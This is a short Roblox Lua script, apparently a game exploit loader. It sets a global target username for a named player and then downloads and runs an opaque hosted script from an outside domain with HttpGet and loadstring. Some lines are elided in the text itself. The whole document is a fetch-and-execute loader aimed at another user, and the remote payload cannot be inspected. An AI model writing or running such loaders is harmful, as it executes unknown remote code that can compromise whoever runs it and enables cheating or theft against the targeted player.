-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "Kz_nwz"
...
task.spawn(function()
    ...
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/d81513f09362221f3a39dddd5fd558cfe774be2298d012ae8d5ce960fc0d561d.lua"))()
end)